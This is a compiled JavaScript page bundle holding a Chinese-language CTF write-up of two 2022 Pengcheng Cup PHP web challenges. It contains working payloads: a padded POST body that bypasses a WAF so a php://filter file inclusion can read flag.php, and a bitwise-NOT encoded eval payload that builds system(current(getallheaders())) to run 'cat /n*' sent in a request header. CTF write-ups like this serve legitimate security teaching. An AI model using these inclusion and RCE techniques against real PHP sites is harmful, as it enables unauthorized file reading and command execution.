"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6088],{7820:(a,e,n)=>{n.r(e),n.d(e,{assets:()=>i,contentTitle:()=>l,default:()=>o,frontMatter:()=>t,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"CTF/Misc/2022\u9e4f\u7a0b\u676f-web","title":"2022\u9e4f\u7a0b\u676f-web","description":"[\u9e4f\u57ce\u676f 2022]\u7b80\u5355\u5305\u542b","source":"@site/docs/CTF/Misc/2022\u9e4f\u7a0b\u676f-web.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/2022\u9e4f\u7a0b\u676f-web","permalink":"/docs/CTF/Misc/2022\u9e4f\u7a0b\u676f-web","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/2022\u9e4f\u7a0b\u676f-web.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"upload-labs","permalink":"/docs/CTF/Misc/\u9776\u573a/upload-labs"},"next":{"title":"2023\u84dd\u5e3d\u676fLove PHP","permalink":"/docs/CTF/Misc/2023\u84dd\u5e3d\u676fLove PHP"}}');var c=n(4848),s=n(8453);const t={},l=void 0,i={},d=[{value:"[\u9e4f\u57ce\u676f 2022]\u7b80\u5355\u5305\u542b",id:"\u9e4f\u57ce\u676f-2022\u7b80\u5355\u5305\u542b",level:3},{value:"[\u9e4f\u57ce\u676f 2022]\u7b80\u5355\u7684php",id:"\u9e4f\u57ce\u676f-2022\u7b80\u5355\u7684php",level:3}];function p(a){const e={code:"code",h3:"h3",p:"p",pre:"pre",...(0,s.R)(),...a.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(e.h3,{id:"\u9e4f\u57ce\u676f-2022\u7b80\u5355\u5305\u542b",children:"[\u9e4f\u57ce\u676f 2022]\u7b80\u5355\u5305\u542b"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:' <?php \r\nhighlight_file(__FILE__);\r\ninclude($_POST["flag"]);\r\n//flag in /var/www/html/flag.php; \n'})}),"\n",(0,c.jsx)(e.p,{children:"\u8fdb\u53bb\u9898\u76ee\uff0c\u5f88\u7b80\u5355\u5c31\u7ed9\u4e86\u4e00\u4e2a\u5305\u542b\u51fd\u6570"}),"\n",(0,c.jsx)(e.p,{children:"\u53d1\u73b0\u6709waf\uff0c\u5c1d\u8bd5\u8bfb\u53d6index.php"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\n$path = $_POST[\"flag\"];\r\n\r\nif (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {\r\n    echo 'nssctf waf!';\r\n} else {\r\n    @include($path);\r\n}\r\n?>\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u5927\u4e8e800\u5b57\u5c31\u884c\u4e86"}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528shell\u547d\u4ee4\u751f\u6210800\u4e2aa"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-bash",children:"perl -e 'print \"a\"x800'\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"aaaaaaaaa=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&flag=php://filter/convert.base64-encode/resource=flag.php\n"})}),"\n",(0,c.jsx)(e.h3,{id:"\u9e4f\u57ce\u676f-2022\u7b80\u5355\u7684php",children:"[\u9e4f\u57ce\u676f 2022]\u7b80\u5355\u7684php"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nshow_source(__FILE__);\r\n    $code = $_GET['code'];\r\n    if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\\'|\"|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|<|>|\\$|\\?|\\^|&|\\|/is',$code)){\r\n        die(' Hello');\r\n    }else if(';' === preg_replace('/[^\\s\\(\\)]+?\\((?R)?\\)/', '', $code)){\r\n        @eval($code);\r\n\r\n    }\r\n\r\n?> \n"})}),"\n",(0,c.jsx)(e.p,{children:"\u65e0\u53c2\u6570rce\uff0c\u65e0\u5b57\u6bcd\u6570\u5b57rce"}),"\n",(0,c.jsx)(e.p,{children:"\u53d6\u53cd\u7ed5\u8fc7"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\r\necho urlencode(~"phpinfo");\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u6784\u9020\u4e00\u4e2aphpinfo"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"[~%8f%97%8f%96%91%99%90][!%FF]();\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u7528\u4e8c\u7ef4\u6570\u7ec4\u8fdb\u884c\u62fc\u63a5\u5fc5\u987b\u6709[!%FF\u8fdb\u884c\u5206\u5272]"}),"\n",(0,c.jsxs)(e.p,{children:["\u8fd9\u91cc\u8fd8\u53ef\u4ee5\u7528",(0,c.jsx)(e.code,{children:"~%cf"}),",\u5f97\u52300\u8fd9\u4e2a\u6570\u5b57\uff0c",(0,c.jsx)(e.code,{children:"['phpinfo'][0]"}),"\u5c31\u662f\u53d6\u6570\u7ec4\u7b2c\u4e00\u4e2a\uff0c\u4e5f\u5c31\u662fphpinfo"]}),"\n",(0,c.jsxs)(e.p,{children:["\u7ee7\u7eed\u6784\u9020\u4e00\u4e2a",(0,c.jsx)(e.code,{children:"system(current(getallheaders()));"})]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"system[!%FF](current[!%FF](getallheaders[!%FF]()));\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]()));\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-http",children:"GET /?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); HTTP/1.1\r\nX: cat /n*\r\nHost: node4.anna.nssctf.cn:28837\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nReferer: http://node4.anna.nssctf.cn:28837/?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]()));\r\nUpgrade-Insecure-Requests: 1\r\nContent-Length: 2\n"})})]})}function o(a={}){const{wrapper:e}={...(0,s.R)(),...a.components};return e?(0,c.jsx)(e,{...a,children:(0,c.jsx)(p,{...a})}):p(a)}},8453:(a,e,n)=>{n.d(e,{R:()=>t,x:()=>l});var r=n(6540);const c={},s=r.createContext(c);function t(a){const e=r.useContext(s);return r.useMemo((function(){return"function"==typeof a?a(e):{...e,...a}}),[e,a])}function l(a){let e;return e=a.disableParentContext?"function"==typeof a.components?a.components(c):a.components||c:t(a.components),r.createElement(s.Provider,{value:e},a.children)}}}]);